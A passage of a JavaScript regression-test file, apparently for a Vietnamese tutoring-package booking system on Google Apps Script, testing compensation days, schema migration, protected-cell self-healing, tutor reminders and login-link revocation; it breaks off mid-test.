  c2.onlyOpen('2026-10-20', '19:00', ['T001']); c2.onlyOpen('2026-11-04', '19:00', ['T001']);
  const [l1] = c2.book('S008', [['2026-10-20', '19:00']]);
  const [l2] = c2.book('S008', [['2026-11-04', '19:00']]);
  assert.strictEqual(c2.row('BOOKINGS', l2.bookingId).sp_id, q.sp_id);
  c2.at('2026-10-20 21:00');
  assert.ok(pickAdmin(c2, l1.bookingId, 'Vắng tutor').ok);
  const q2 = c2.row('STUDENT_PACKAGES', q.sp_id);
  assert.strictEqual(c2.keyOf(c2.sp('SP00008').end_date) + '|' + c2.keyOf(q2.start_date) + '|' + c2.keyOf(q2.end_date), '2026-11-04|2026-11-05|2026-11-18');
  assert.strictEqual(c2.row('BOOKINGS', l2.bookingId).sp_id, 'SP00008', 'buổi 04/11 chuyển sang gói trước');
  assert.ok(c2.rows('ACTIVITY_LOG').some(l => l.action === 'BOOKING_MOVED_PKG'));
  // Gói đã hết hạn lâu (S006, 20/09 đến 03/10): admin sửa hạn tới sau hôm nay thì mở lại, học viên nhận email
  const sheet = c2.env.globals.SpreadsheetApp.openById('DB_STAGING_TEST').getSheetByName('STUDENT_PACKAGES');
  const s6 = c2.sp('SP00006'), rg = sheet.getRange(s6._row, api2.SCHEMA.STUDENT_PACKAGES.cols.indexOf('end_date') + 1);
  rg.setValue(new Date(2026, 9, 25));
  assert.ok(api2.onEditInstallable({ range: rg, oldValue: '', user: { getEmail: () => 'admin@thaiput.vn' } }).ok);
  const s6b = c2.sp('SP00006');
  assert.strictEqual(s6b.status + '|' + c2.keyOf(s6b.end_date) + '|' + s6b.comp_days_admin, 'ACTIVE|2026-10-25|22');
  assert.ok(c2.mailsTo(EMAIL.S006).some(m => /Hạn gói/.test(m.subject)));
});

t('I115', '5M chuyển đổi: code mới chạy được trước menu 1 (thiếu cột: luật cũ); xem trước liệt kê gói sẽ đổi mà không ghi; menu 1 thêm cột, đổi buổi kỹ thuật "Tính lương" sang Lỗi khách quan, báo admin, chạy lại không đổi gì', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  const ss = env.state.spreadsheets.DB_STAGING_TEST;
  // Bỏ cột mới như file DB của bản 8.0.10
  const drop = (tab, cols) => { const sh = ss.sheets[tab], idx = cols.map(x => sh.values[0].indexOf(x)).filter(i => i !== -1).sort((a, b) => b - a); sh.values.forEach(r => idx.forEach(i => r.splice(i, 1))); };
  drop('BOOKINGS', ['tech_fault', 'tech_decided_at', 'comp_days', 'comp_gap']);
  drop('STUDENT_PACKAGES', ['start_date_locked', 'start_locked_at', 'start_booking_id', 'comp_days', 'comp_days_admin']);
  delete env.state.props.MIG_5M;   // hệ thống 8.0.10: chưa chạy bước chuyển 8.1.0
  api.clearDbCache_();
  assert.strictEqual(api.pkgCompReady_(), false);
  c.onlyOpen('2026-10-14', '19:00', ['T001']); c.onlyOpen('2026-10-15', '19:00', ['T001']);
  const [a] = c.book('S002', [['2026-10-14', '19:00']]);
  const [b] = c.book('S003', [['2026-10-15', '19:00']]);
  c.at('2026-10-15 19:40');
  assert.ok(api.submitSessionResultFor_('T001', b.bookingId, 'TECH_ISSUE', EMAIL.T001).ok, 'chưa có cột tech_fault: vẫn ghi được');
  api.adminPayrollOverride_(b.bookingId, 'admin@thaiput.vn', true);
  c.at('2026-10-14 19:40');
  api.submitSessionResultFor_('T001', a.bookingId, 'COMPLETED', EMAIL.T001);
  c.at('2026-10-16 10:00');
  const sp2 = c.sp('SP00002');
  assert.strictEqual(sp2.start_source + '|' + c.keyOf(sp2.end_date), 'BOOKING|2026-10-27', 'luật cũ 8.0.10');
  const before = JSON.stringify(ss.sheets.STUDENT_PACKAGES.values);
  const dry = api.compDryRun_();
  assert.strictEqual(JSON.stringify(ss.sheets.STUDENT_PACKAGES.values), before, 'xem trước không ghi');
  const d3 = dry.find(x => x.sp_id === 'SP00003');
  assert.ok(d3 && d3.after.end === '2026-11-04', 'S003: buổi kỹ thuật cũ "Tính lương" thành lỗi khách quan, bù 1 ngày: ' + JSON.stringify(dry));
  assert.ok(!dry.some(x => x.sp_id === 'SP00002'), 'S002 chỉ đổi nguồn ngày bắt đầu, không đổi ngày');
  const dbSs = env.globals.SpreadsheetApp.openById('DB_STAGING_TEST');
  const r = api.setupCore_(dbSs);
  assert.ok(r.lines.some(l => /1 buổi kỹ thuật/.test(l)), r.lines.join('\n'));
  api.clearDbCache_();
  assert.ok(api.pkgCompReady_());
  assert.strictEqual(c.row('BOOKINGS', b.bookingId).tech_fault, 'OBJECTIVE');
  assert.strictEqual(c.keyOf(c.sp('SP00003').end_date), '2026-11-04');
  assert.strictEqual(c.sp('SP00002').start_source, 'LOCKED');
  assert.strictEqual(c.keyOf(c.sp('SP00005').start_date_locked), '2026-10-01');
  assert.ok(c.rows('NOTIFICATIONS').some(n => n.event === 'TECH_MIGRATED' && n.entity_id === b.bookingId));
  const snap = JSON.stringify(ss.sheets.STUDENT_PACKAGES.values);
  const r2 = api.setupCore_(dbSs);
  assert.ok(!r2.lines.some(l => /buổi kỹ thuật|Tính lại gói theo luật/.test(l)));
  assert.strictEqual(JSON.stringify(ss.sheets.STUDENT_PACKAGES.values), snap, 'chạy lại menu 1 không đổi gói');
});

t('I116', '5M soát chéo (hồi quy): admin sửa hạn thì gói nối đuôi dời theo (A); mở khoá có gói QUEUED không làm chồng gói, không báo tự lành giả (B); ngày bù tay khi ngày bắt đầu còn tạm tính vẫn đặt được (C); khoá sớm hơn làm buổi đã đặt ra ngoài hạn thì báo (D); Trial quá lượt thì báo (E); gói sau đã chạy thì ngày bù sang gói sau (F)', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  const sheet = env.globals.SpreadsheetApp.openById('DB_STAGING_TEST').getSheetByName('STUDENT_PACKAGES');
  const editEnd = (spId, d) => { const sp = c.sp(spId), rg = sheet.getRange(sp._row, api.SCHEMA.STUDENT_PACKAGES.cols.indexOf('end_date') + 1); rg.setValue(d); return api.onEditInstallable({ range: rg, oldValue: '', user: { getEmail: () => 'admin@thaiput.vn' } }); };
  const buyQueued = (sid, code) => { const reg = api.submitRegistration_(c.form({ email: EMAIL[sid], name: sid, package_code: code })); assert.ok(api.approveRegistration_(reg.regId, 'admin@thaiput.vn').ok); return c.rows('STUDENT_PACKAGES').filter(p => p.student_id === sid).pop().sp_id; };
  // A: S008 05/10 đến 03/11 + gói 2 tuần nối đuôi; admin sửa hạn 06/11
  const q8 = buyQueued('S008', 'PASS_2W');
  assert.ok(editEnd('SP00008', new Date(2026, 10, 6)).ok);
  assert.strictEqual(c.keyOf(c.row('STUDENT_PACKAGES', q8).start_date) + '|' + c.keyOf(c.row('STUDENT_PACKAGES', q8).end_date), '2026-11-07|2026-11-20', 'A: gói sau dời 3 ngày');
  // B: S007 12/10 đến 25/10 + gói nối đuôi 26/10 đến 08/11; khoá 14/10, mở 17/10
  const q7 = buyQueued('S007', 'PASS_2W');
  c.at('2026-10-14 09:00'); api.suspendStudent_('S007', 'admin@thaiput.vn');
  c.at('2026-10-17 09:00'); api.unsuspendStudent_('S007', 'admin@thaiput.vn');
  c.at('2026-10-17 10:05'); api.hourlyJob();
  const a7 = c.sp('SP00007'), b7 = c.row('STUDENT_PACKAGES', q7);
  assert.strictEqual([c.keyOf(a7.end_date), c.keyOf(b7.start_date), c.keyOf(b7.start_date_locked), c.keyOf(b7.end_date)].join('|'), '2026-10-28|2026-10-29|2026-10-29|2026-11-11', 'B: không chồng, gói sau giữ 14 ngày');
  assert.ok(!c.rows('NOTIFICATIONS').some(n => n.event === 'PACKAGE_HEALED' && n.entity_id.indexOf(q7) !== -1), 'B: không báo tự lành giả');
  // C: S002 đặt 14/10 (tạm tính 14/10 đến 27/10); admin cộng tay tới 31/10; đặt 30/10 được
  c.at('2026-10-12 10:00'); c.onlyOpen('2026-10-14', '19:00', ['T001']); c.onlyOpen('2026-10-30', '19:00', ['T001']);
  c.book('S002', [['2026-10-14', '19:00']]);
  assert.ok(editEnd('SP00002', new Date(2026, 9, 31)).ok);
  assert.deepStrictEqual(c.reasons(c.book('S002', [['2026-10-30', '19:00']])), ['OK'], 'C');
  // D: S001 Trial: 14/10 kỹ thuật (lỗi tutor), 16/10 đặt; tạm tính 16/10 đến 22/10; đặt 22/10; admin đổi 14/10 sang lỗi học viên: hạn 20/10, buổi 22/10 ra ngoài
  const c2 = mk('2026-10-12 10:00'), a2 = c2.api;
  ['14', '16', '22'].forEach(d => c2.onlyOpen('2026-10-' + d, '19:00', ['T001']));
  const [t14] = c2.book('S001', [['2026-10-14', '19:00']]);
  c2.at('2026-10-14 19:40'); a2.submitSessionResultFor_('T001', t14.bookingId, 'TECH_ISSUE', EMAIL.T001);
  c2.at('2026-10-15 09:00'); c2.book('S001', [['2026-10-16', '19:00']]);
  assert.strictEqual(c2.keyOf(c2.sp('SP00001').end_date), '2026-10-22');
  const [b22] = c2.book('S001', [['2026-10-22', '19:00']]);
  assert.ok(b22.ok, 'Trial: 14/10 kỹ thuật lỗi tutor không trừ, nên còn lượt cho 22/10');
  pickAdmin(c2, t14.bookingId, 'Tính lương buổi kỹ thuật');
  const s1 = c2.sp('SP00001');
  assert.strictEqual(s1.start_source + '|' + c2.keyOf(s1.start_date) + '|' + c2.keyOf(s1.end_date), 'LOCKED|2026-10-14|2026-10-20');
  // E: nay 3 buổi trừ lượt trên Trial 2 lượt: báo đúng 1 lần dù tính lại nhiều lần; D: buổi 22/10 ngoài hạn 20/10
  c2.at('2026-10-15 10:05'); a2.hourlyJob(); c2.at('2026-10-15 11:05'); a2.hourlyJob();
  assert.strictEqual(c2.rows('NOTIFICATIONS').filter(n => n.event === 'TRIAL_OVER_LIMIT').length, 1, 'E');
  assert.ok(c2.rows('NOTIFICATIONS').some(n => n.event === 'BOOKING_OUT_OF_RANGE' && /BK000003/.test(n.message)), 'D (Trial)');
  // D (buổi ra ngoài hạn): S002 2 tuần: 14/10 kỹ thuật, đặt 18/10 rồi 30/10; đổi 14/10 sang lỗi học viên: khoá 14/10, hạn 27/10, buổi 30/10 ngoài hạn
  const c3 = mk('2026-10-12 10:00'), a3 = c3.api;
  ['14', '18', '30'].forEach(d => c3.onlyOpen('2026-10-' + d, '19:00', ['T001']));
  const [k14] = c3.book('S002', [['2026-10-14', '19:00']]);
  c3.at('2026-10-14 19:40'); a3.submitSessionResultFor_('T001', k14.bookingId, 'TECH_ISSUE', EMAIL.T001);
  c3.at('2026-10-15 09:00');
  assert.deepStrictEqual(c3.reasons(c3.book('S002', [['2026-10-18', '19:00'], ['2026-10-30', '19:00']])), ['OK', 'OK']);
  pickAdmin(c3, k14.bookingId, 'Tính lương buổi kỹ thuật');
  assert.strictEqual(c3.keyOf(c3.sp('SP00002').end_date), '2026-10-27');
  assert.ok(c3.rows('NOTIFICATIONS').some(n => n.event === 'BOOKING_OUT_OF_RANGE' && n.entity_id === 'SP00002'), 'D: báo buổi ngoài hạn');
  // F: S008 05/10 đến 03/11, gói nối đuôi 04/11; buổi 03/11 19:00 tutor vắng, admin ghi lúc 08:00 ngày 04/11 (sau dailyJob): ngày bù sang gói sau
  const c4 = mk('2026-10-12 10:00'), a4 = c4.api;
  const reg4 = a4.submitRegistration_(c4.form({ email: EMAIL.S008, name: 'S008', package_code: 'PASS_2W' })); a4.approveRegistration_(reg4.regId, 'admin@thaiput.vn');
  const nx = c4.rows('STUDENT_PACKAGES').filter(p => p.student_id === 'S008').pop().sp_id;
  c4.at('2026-10-30 10:00'); c4.onlyOpen('2026-11-03', '19:00', ['T001']);
  const [l3] = c4.book('S008', [['2026-11-03', '19:00']]);
  c4.at('2026-11-04 06:00'); a4.dailyJob();
  assert.strictEqual(c4.sp('SP00008').status + '|' + c4.row('STUDENT_PACKAGES', nx).status, 'EXPIRED|ACTIVE');
  c4.at('2026-11-04 08:00'); assert.ok(pickAdmin(c4, l3.bookingId, 'Vắng tutor').ok);
  const n4 = c4.row('STUDENT_PACKAGES', nx);
  assert.strictEqual(c4.sp('SP00008').status + '|' + c4.keyOf(n4.end_date) + '|' + n4.comp_days_admin, 'EXPIRED|2026-11-18|1', 'F: gói sau +1 ngày');
  assert.ok(c4.mailsTo(EMAIL.S008).some(m => /cộng 1 ngày/.test(m.subject)));
});

t('I117', '5M soát chéo (hồi quy): dán đè ô hệ thống không xoá ô và báo khôi phục (H3); dán nhiều ô comp_days_admin và status bị lấy lại (G); huỷ muộn chặn đặt lại cùng ngày (H); chuyển đổi menu 1 không email học viên (M2)', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  const raw = env.state.spreadsheets.DB_STAGING_TEST.sheets.STUDENT_PACKAGES.values;
  const sheet = env.globals.SpreadsheetApp.openById('DB_STAGING_TEST').getSheetByName('STUDENT_PACKAGES');
  const col = n => api.SCHEMA.STUDENT_PACKAGES.cols.indexOf(n) + 1;
  // H3: dán đè purchased_at (không có oldValue): không xoá, báo CRITICAL
  const sp = c.sp('SP00003');
  let rg = sheet.getRange(sp._row, col('purchased_at')); rg.setValue('x');
  api.onEditInstallable({ range: rg, user: { getEmail: () => 'admin@thaiput.vn' } });
  assert.strictEqual(raw[sp._row - 1][col('purchased_at') - 1], 'x', 'không xoá ô khi không biết giá trị cũ');
  assert.ok(c.rows('NOTIFICATIONS').some(n => n.event === 'PACKAGE_PASTE_UNSAFE' && n.level === 'CRITICAL'));
  // Dán đè status (không có oldValue): tự lành ngay
  rg = sheet.getRange(sp._row, col('status')); rg.setValue('');
  api.onEditInstallable({ range: rg, user: { getEmail: () => 'admin@thaiput.vn' } });
  assert.strictEqual(c.sp('SP00003').status, 'ACTIVE');
  // G: người ngoài dán 2 dòng comp_days_admin = 30 và status EXPIRED
  const r5 = c.sp('SP00005')._row, r3 = c.sp('SP00003')._row, lo = Math.min(r3, r5);
  [r3, r5].forEach(r => { raw[r - 1][col('comp_days_admin') - 1] = 30; raw[r - 1][col('status') - 1] = 'EXPIRED'; });
  const multi = sheet.getRange(lo, col('status'), Math.abs(r5 - r3) + 1, col('comp_days_admin') - col('status') + 1);
  const res = api.onEditInstallable({ range: multi, user: { getEmail: () => 'intern@gmail.com' } });
  assert.ok(res && !res.ok);
  assert.strictEqual([c.sp('SP00003').status, c.keyOf(c.sp('SP00003').end_date), c.sp('SP00005').status, c.keyOf(c.sp('SP00005').end_date)].join('|'), 'ACTIVE|2026-11-03|ACTIVE|2026-10-30');
  // Dán qua API (không qua onEdit): hourlyJob lấy lại
  raw[r3 - 1][col('comp_days_admin') - 1] = 9;
  c.at('2026-10-12 11:05'); api.hourlyJob();
  assert.strictEqual(c.keyOf(c.sp('SP00003').end_date) + '|' + (c.sp('SP00003').comp_days_admin || 0), '2026-11-03|0');
  // H: huỷ muộn 15/10 rồi admin đặt thay 15/10 giờ khác: chặn 1 buổi mỗi ngày
  c.at('2026-10-12 10:00'); c.onlyOpen('2026-10-15', '19:00', ['T001']); c.setSlot('T002', '2026-10-15', '20:00', 'OPEN');
  const [b] = c.book('S001', [['2026-10-15', '19:00']]);
  c.at('2026-10-14 16:00'); assert.ok(pickAdmin(c, b.bookingId, 'Huỷ bởi admin').ok);
  const again = api.bookSessionsFor_('S001', [{ date: '2026-10-15', slot: '20:00' }], 'admin@thaiput.vn', { override: true });
  assert.strictEqual(again[0].reason, 'ONE_PER_DAY', 'H');
  // M2: chuyển đổi menu 1 không gửi email cho học viên
  const c5 = mk('2026-10-12 10:00'), a5 = c5.api, ss5 = c5.env.state.spreadsheets.DB_STAGING_TEST;
  const drop = (tab, cols) => { const sh = ss5.sheets[tab], idx = cols.map(x => sh.values[0].indexOf(x)).filter(i => i !== -1).sort((x, y) => y - x); sh.values.forEach(r => idx.forEach(i => r.splice(i, 1))); };
  drop('BOOKINGS', ['tech_fault', 'tech_decided_at', 'comp_days', 'comp_gap']);
  drop('STUDENT_PACKAGES', ['start_date_locked', 'start_locked_at', 'start_booking_id', 'comp_days', 'comp_days_admin']);
  delete c5.env.state.props.MIG_5M;
  a5.clearDbCache_();
  a5.withLock_(() => a5.table_('BOOKINGS').insert({ booking_id: 'BK900003', student_id: 'S003', tutor_id: 'T001', sp_id: 'SP00003', date: D(10, 10), slot: '19:00', status: 'TUTOR_ABSENT', created_at: new Date(2026, 9, 1) }));
  const before = c5.mailsTo(EMAIL.S003).length;
  a5.setupCore_(c5.env.globals.SpreadsheetApp.openById('DB_STAGING_TEST'));
  assert.strictEqual(c5.keyOf(c5.sp('SP00003').end_date), '2026-11-04', 'chuyển đổi vẫn cộng ngày cho buổi cũ');
  assert.strictEqual(c5.mailsTo(EMAIL.S003).length, before, 'M2: không email học viên');
});

t('I118', '5M soát vòng 2 (hồi quy): ngày bù chuyển sang gói sau không cộng lặp khi đổi lỗi qua lại, rút đúng khi sang lỗi học viên (1); Xoá dữ liệu test xoá bản lưu ngày bù (2); mua gói khi đang tạm khoá rồi mở khoá không chồng gói (3); gõ vào ô hệ thống trống bị xoá lại (4); dán INACTIVE lên gói nối đuôi tự về QUEUED (5)', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  const reg = api.submitRegistration_(c.form({ email: EMAIL.S008, name: 'S008', package_code: 'PASS_2W' })); api.approveRegistration_(reg.regId, 'admin@thaiput.vn');
  const nx = c.rows('STUDENT_PACKAGES').filter(p => p.student_id === 'S008').pop().sp_id;
  c.at('2026-10-30 10:00'); c.onlyOpen('2026-11-03', '19:00', ['T001']);
  const [l3] = c.book('S008', [['2026-11-03', '19:00']]);
  c.at('2026-11-03 19:40'); api.submitSessionResultFor_('T001', l3.bookingId, 'TECH_ISSUE', EMAIL.T001);
  c.at('2026-11-04 06:00'); api.dailyJob();
  c.at('2026-11-04 08:00');
  const endN = () => c.keyOf(c.row('STUDENT_PACKAGES', nx).end_date) + '|' + (c.row('STUDENT_PACKAGES', nx).comp_days_admin || 0);
  ['Lỗi khách quan: tính lương và bù', 'Không tính lương buổi kỹ thuật', 'Lỗi khách quan: tính lương và bù'].forEach(v => pickAdmin(c, l3.bookingId, v));
  assert.strictEqual(endN(), '2026-11-19|0', 'buổi kỹ thuật lúc 19:40 ngày 03/11 bù trong gói trước (+1 và 1 ngày để kịp đặt), gói sau dời 2 ngày, không chuyển ngày bù');
  // Trường hợp gói trước đã hết hạn lúc buổi thành buổi bù: chuyển sang gói sau đúng 1 lần
  const c2 = mk('2026-10-12 10:00'), a2 = c2.api;
  const r2 = a2.submitRegistration_(c2.form({ email: EMAIL.S008, name: 'S008', package_code: 'PASS_2W' })); a2.approveRegistration_(r2.regId, 'admin@thaiput.vn');
  const nx2 = c2.rows('STUDENT_PACKAGES').filter(p => p.student_id === 'S008').pop().sp_id;
  c2.at('2026-10-30 10:00'); c2.onlyOpen('2026-11-03', '19:00', ['T001']);
  const [m3] = c2.book('S008', [['2026-11-03', '19:00']]);
  c2.at('2026-11-04 06:00'); a2.dailyJob();
  c2.at('2026-11-04 08:00'); a2.submitSessionResultFor_('T001', m3.bookingId, 'TECH_ISSUE', EMAIL.T001);
  const e2 = () => c2.keyOf(c2.row('STUDENT_PACKAGES', nx2).end_date) + '|' + (c2.row('STUDENT_PACKAGES', nx2).comp_days_admin || 0);
  assert.strictEqual(e2(), '2026-11-18|1', 'chuyển 1 ngày sang gói sau');
  pickAdmin(c2, m3.bookingId, 'Tính lương buổi kỹ thuật');
  assert.strictEqual(e2(), '2026-11-17|0', 'lỗi học viên: rút ở gói sau');
  ['Không tính lương buổi kỹ thuật', 'Lỗi khách quan: tính lương và bù'].forEach(v => pickAdmin(c2, m3.bookingId, v));
  assert.strictEqual(e2(), '2026-11-18|1', 'đổi qua lại: đúng 1 ngày, không cộng lặp');
  c2.at('2026-11-04 09:05'); a2.hourlyJob();
  assert.strictEqual(e2(), '2026-11-18|1', 'hourlyJob không lấy mất ngày (bản lưu khớp)');
  // Học viên đặt đúng ngày được cộng (18/11) rồi buổi đổi sang lỗi học viên: không rút, báo admin
  c2.onlyOpen('2026-11-18', '19:00', ['T001']);
  assert.deepStrictEqual(c2.reasons(c2.book('S008', [['2026-11-18', '19:00']])), ['OK']);
  pickAdmin(c2, m3.bookingId, 'Tính lương buổi kỹ thuật');
  assert.strictEqual(e2(), '2026-11-18|1', 'không rút khi đã đặt vào ngày được cộng');
  assert.ok(c2.rows('NOTIFICATIONS').some(n => n.event === 'COMP_RETRACT_BLOCKED' && n.entity_id === m3.bookingId));
  // (2) Xoá dữ liệu test xoá bản lưu ngày bù
  assert.ok(Object.keys(c2.env.state.props).some(k => /^PKGADM_/.test(k)));
  a2.withLock_(() => { const t = a2.table_('CONFIG'), r = t.byId('ALLOW_DATA_RESET'); if (r) t.update(r, { value: 'TRUE' }); else t.insert({ key: 'ALLOW_DATA_RESET', value: 'TRUE' }); }); a2.clearConfigCache_();
  assert.ok(a2.resetTestData_('KEEP_TUTORS', 'XOA DU LIEU STAGING MUC 1', 'admin.karn@gmail.com').ok);
  assert.ok(!Object.keys(c2.env.state.props).some(k => /^(PKGADM|COMPNEXT)_/.test(k)), 'không còn bản lưu cũ');
  // (3) S007 (12/10 đến 25/10) tạm khoá 14/10, mua gói 2 tuần lúc đang khoá, mở khoá 17/10 (môi trường mới)
  const c3 = mk('2026-10-12 10:00');
  c3.at('2026-10-14 09:00'); c3.api.suspendStudent_('S007', 'admin@thaiput.vn');
  c3.at('2026-10-15 09:00');
  const r7 = c3.api.submitRegistration_(c3.form({ email: EMAIL.S007, name: 'S007', package_code: 'PASS_2W' })); c3.api.approveRegistration_(r7.regId, 'admin@thaiput.vn');
  const q7 = c3.rows('STUDENT_PACKAGES').filter(p => p.student_id === 'S007').pop().sp_id;
  c3.at('2026-10-17 09:00'); c3.api.unsuspendStudent_('S007', 'admin@thaiput.vn');
  c3.at('2026-10-17 10:05'); c3.api.hourlyJob();
  assert.strictEqual(c3.keyOf(c3.sp('SP00007').end_date) + '|' + c3.keyOf(c3.row('STUDENT_PACKAGES', q7).start_date) + '|' + c3.keyOf(c3.row('STUDENT_PACKAGES', q7).end_date), '2026-10-28|2026-10-29|2026-11-11');
  // (4) gõ vào ô sessions_total trống của gói 1 tháng: bị xoá lại, không chặn đặt
  const sheet = c3.env.globals.SpreadsheetApp.openById('DB_STAGING_TEST').getSheetByName('STUDENT_PACKAGES'), col = n => c3.api.SCHEMA.STUDENT_PACKAGES.cols.indexOf(n) + 1;
  const s3 = c3.sp('SP00003'); let rg = sheet.getRange(s3._row, col('sessions_total')); rg.setValue(2);
  c3.api.onEditInstallable({ range: rg, value: '2', user: { getEmail: () => 'intern@gmail.com' } });
  assert.strictEqual(c3.sp('SP00003').sessions_total, '');
  // (5) dán INACTIVE lên gói nối đuôi: một lượt tính lại là về QUEUED
  const raw = c3.env.state.spreadsheets.DB_STAGING_TEST.sheets.STUDENT_PACKAGES.values;
  raw[c3.row('STUDENT_PACKAGES', q7)._row - 1][col('status') - 1] = 'INACTIVE';
  c3.at('2026-10-17 11:05'); c3.api.hourlyJob();
  assert.strictEqual(c3.row('STUDENT_PACKAGES', q7).status, 'QUEUED');
  assert.ok(!c3.rows('NOTIFICATIONS').some(n => n.event === 'PACKAGE_HEALED' && n.entity_id.indexOf(q7) !== -1 && /2026-10-29→/.test(n.message)), 'không báo tự lành giả');
});

// ══ Chunk 5J: đăng nhập theo vai trò, lịch tutor, thông báo học viên, câu 29 đổi ══
const atK = (c, s) => c.api.setSimNow_(s);

t('I119', '5J: nhắc tutor 15:00 thứ Sáu chỉ cho tutor chưa mở giờ tuần sau, gửi sau khi nhả khoá, không gửi trùng; tutor mở giờ thì thôi nhắc; lỡ lượt thì làm bù; mẫu không còn chữ "hôm nay"; trigger sundayRemind cũ chạy không lỗi', () => {
  const c = mk('2026-10-16 14:30'), { api, env } = c;
  api.setAvailabilityFor_('T002', [{ date: K(20, 10), slot: '19:00', open: true }], EMAIL.T002);
  api.hourlyJob();
  const rem = () => env.state.mails.filter(m => /availability/i.test(m.subject) && /Vui lòng mở lịch/.test(m.subject));
  assert.strictEqual(rem().length, 0, 'chưa tới 15:00 thứ Sáu');
  atK(c, '2026-10-16 15:05'); api.hourlyJob();
  const got = rem().map(m => m.to).sort();
  assert.deepStrictEqual(got, [EMAIL.T001, EMAIL.T003, EMAIL.T004].sort(), 'chỉ tutor chưa mở giờ tuần 19/10');
  assert.ok(rem().every(m => m.inLock === false), 'gửi sau khi nhả khoá (không chặn lượt đặt buổi)');
  assert.ok(rem().every(m => /22:00 Thứ 7 17\/10/.test(m.htmlBody) && /22:00 Sat 17\/10/.test(m.htmlBody) && !/hôm nay|today/i.test(m.htmlBody)), rem()[0].htmlBody.substring(0, 400));
  atK(c, '2026-10-16 16:05'); api.hourlyJob();
  assert.strictEqual(rem().length, 3, 'không gửi lại');
  // Tuần sau: hai mốc nhắc, lỡ cả hai (job dừng): chỉ gửi 1 lần theo mốc mới nhất; tutor đã mở giờ thì không nhắc
  api.withLock_(() => { api.table_('CONFIG').insert({ key: 'TUTOR_REMIND_AT', value: 'FRI 9, FRI 15' }); }); api.clearConfigCache_();
  api.setAvailabilityFor_('T003', [{ date: K(27, 10), slot: '19:00', open: true }], EMAIL.T003);
  atK(c, '2026-10-23 18:05'); api.hourlyJob();
  const w2 = rem().slice(3).map(m => m.to).sort();
  assert.deepStrictEqual(w2, [EMAIL.T001, EMAIL.T002, EMAIL.T004].sort());
  atK(c, '2026-10-23 19:05'); api.hourlyJob();
  assert.strictEqual(rem().length, 6, 'mốc 09:00 đã đánh dấu xong, không gửi thêm');
  // Sau hạn mở lịch: không nhắc nữa
  atK(c, '2026-10-31 22:30'); api.hourlyJob();
  assert.strictEqual(rem().length, 6, 'tuần 02/11: job chỉ chạy lại sau 22:00 thứ Bảy (đã quá hạn mở lịch): không nhắc nữa');
  assert.strictEqual(api.sundayRemind(), 0, 'trigger cũ còn sót: chạy không lỗi');
});

t('I120', '5J: thông báo "đã có giờ tuần sau" trên trang học viên: thứ Sáu chưa hiện; thứ Bảy chưa có giờ trống chưa hiện; tutor mở giờ đầu tiên thì hiện; học viên hết gói không thấy; thứ Hai hết hiện', () => {
  const c = mk('2026-10-16 20:00'), { api } = c;
  const tok3 = tokenFor(c, 'S003'), tok6 = tokenFor(c, 'S006');
  const wb = (tok) => api.apiStudentHome(tok, { slots: true }).data.weekBanner;
  assert.strictEqual(wb(tok3), null, 'thứ Sáu: chưa hiện');
  atK(c, '2026-10-17 00:30');
  assert.strictEqual(wb(tok3), null, 'thứ Bảy nhưng tuần 19/10 chưa có giờ trống');
  api.setAvailabilityFor_('T001', [{ date: K(20, 10), slot: '19:00', open: true }], EMAIL.T001);
  const b = wb(tok3);
  assert.ok(b && b.week === '2026-10-19' && b.monday === '19/10' && b.cutoff === '15:00', JSON.stringify(b));
  assert.strictEqual(wb(tok6), null, 'S006 hết gói: không thấy');
  assert.ok(api.apiStudentHome(tok3).data.weekBanner, 'không lấy slot kèm theo cũng tính được (dùng lưới đã đệm)');
  atK(c, '2026-10-19 00:05');
  assert.strictEqual(wb(tok3), null, 'thứ Hai: hết hiện');
});

t('I121', '5J: thoát mọi thiết bị huỷ cả link còn hạn; khoá tài khoản huỷ link; ô cấu hình cũ admin đã chỉnh được dùng tới khi chạy menu 1 rồi được chép; ô cũ bằng mặc định cũ thì theo mặc định mới; menu 2 báo lịch tutor sai và Google chưa cài', () => {
  const c = mk('2026-10-12 10:00'), { api, env } = c;
  const raw = linkFor(c, 'T002');
  assert.strictEqual(api.logoutAll_(api.userById_('T002'), 'admin@thaiput.vn').ok, true);
  assert.strictEqual(api.apiExchangeToken(raw, UA_WIN).reason, 'LINK_EXPIRED', 'link gửi trước khi thoát mọi thiết bị không dùng được nữa');
  const raw2 = linkFor(c, 'S003');
  api.withLock_(() => api.table_('USERS').update(api.userById_('S003'), { status: 'DISABLED' }));
  atK(c, '2026-10-12 10:05'); api.hourlyJob();
  api.withLock_(() => api.table_('USERS').update(api.userById_('S003'), { status: 'ACTIVE' }));
  assert.strictEqual(api.apiExchangeToken(raw2, UA_WIN).reason, 'LINK_EXPIRED', 'mở lại tài khoản: link cũ không sống lại');
  // Ô cũ: LOGIN_LINK_MINUTES = 30 (admin đã chỉnh), STAFF_LOGIN_LINK_MAX_USES = 1 (mặc định cũ)
  api.withLock_(() => { const t = api.table_('CONFIG'); t.insert({ key: 'LOGIN_LINK_MINUTES', value: '30' }); t.insert({ key: 'STAFF_LOGIN_LINK_MAX_USES', value: '1' }); }); api.clearConfigCache_();
  assert.strictEqual(api.cfg_('STUDENT_LINK_MINUTES') + '|' + api.cfg_('TUTOR_LINK_MINUTES') + '|' + api.cfg_('ADMIN_LINK_MINUTES'), '30|30|1440');
  assert.strictEqual(api.cfg_('TUTOR_LINK_MAX_USES'), 0, 'ô cũ còn mặc định cũ 1: dùng mặc định mới 0 (quyết định 01/11)');
  const r = api.setupCore_(env.globals.SpreadsheetApp.openById('DB_STAGING_TEST'));
  api.clearDbCache_(); api.clearConfigCache_();
  const cfgRow = k => api.table_('CONFIG').byId(k);
  assert.strictEqual(String(cfgRow('STUDENT_LINK_MINUTES').value) + '|' + String(cfgRow('TUTOR_LINK_MINUTES').value), '30|30', 'menu 1 chép giá trị admin đã chỉnh');
  assert.strictEqual(String(cfgRow('TUTOR_LINK_MAX_USES').value), '0');
  assert.ok(/Không dùng từ 8.1.1/.test(cfgRow('LOGIN_LINK_MINUTES').note));
  // Menu 2: lịch sai và Google chưa cài
  api.withLock_(() => { const t = api.table_('CONFIG'); t.insert({ key: 'TUTOR_DEADLINE_AT', value: 'MON 10' }); }); api.clearConfigCache_();
  const ts = api.testSystem();
  assert.ok(ts.errors.some(x => /TUTOR_DEADLINE_AT/.test(x)), ts.errors.join(' | '));
